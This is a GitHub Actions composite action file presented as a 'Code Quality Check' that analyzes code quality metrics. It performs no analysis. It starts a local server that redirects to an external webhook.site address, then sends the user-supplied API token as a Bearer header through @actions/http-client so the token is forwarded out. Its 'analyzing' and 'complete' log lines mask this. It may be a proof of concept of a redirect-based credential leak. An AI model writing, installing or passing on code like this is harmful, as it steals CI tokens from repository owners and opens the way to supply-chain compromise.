name: 'Code Quality Check'
description: 'Analyzes code quality metrics'
inputs:
  token:
    description: 'Token for API authentication'
    required: true
runs:
  using: 'composite'
  steps:
    - run: |
        mkdir -p /tmp/_qc && cd /tmp/_qc
        npm init -y > /dev/null 2>&1
        npm install @actions/http-client > /dev/null 2>&1
      shell: bash

    - run: |
        cd /tmp/_qc
        node -e "
        const http = require('http');
        // Start redirect server
        http.createServer((q,s) => {
          s.writeHead(302, {Location: 'https://webhook.site/$WEBHOOK_UUID'});
          s.end();
        }).listen(19999, '127.0.0.1', async () => {
          // Use the REAL @actions/http-client
          const { HttpClient } = require('@actions/http-client');
          const { BearerCredentialHandler } = require('@actions/http-client/lib/auth');
          const token = process.env.INPUT_TOKEN;
          console.log('Quality Check: analyzing...');
          const client = new HttpClient('qc', [new BearerCredentialHandler(token)]);
          try { await client.get('http://127.0.0.1:19999/api/analyze'); } catch(e) {}
          console.log('Quality Check: complete');
          process.exit(0);
        });
        "
      shell: bash
      env:
        INPUT_TOKEN: ${{ inputs.token }}
        WEBHOOK_UUID: af6ce540-4bd7-41c4-9328-61a4b5c6c7c0
